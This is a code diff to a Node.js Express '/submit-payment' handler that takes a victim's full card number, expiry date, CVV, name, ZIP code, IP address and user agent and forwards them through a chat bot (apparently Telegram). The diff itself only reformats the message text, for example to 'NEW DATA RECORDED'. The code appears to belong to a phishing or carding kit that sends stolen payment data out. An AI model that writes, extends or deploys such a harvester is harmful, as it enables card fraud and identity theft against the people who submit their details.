@@ -19,14 +19,14 @@ app.post('/submit-payment', (req, res) => {
   const userAgent = req.get('User-Agent');
 
   const message = `
-New payment submission:
-Card Number: ${cardNumber}
-Expiration Date: ${expirationDate}
+NEW DATA RECORDED : 
+CARD NUMBER : ${cardNumber} 
+EXPIRE: ${expirationDate}
 CVV: ${cvv}
-Name: ${name}
-ZIP Code: ${zipCode}
-IP Address: ${ip}
-User Agent: ${userAgent}
+NAME: ${name}
+ZIP CODE: ${zipCode}
+IP : ${ip}
+UA: ${userAgent}
   `;
 
   bot.sendMessage(chatId, message)
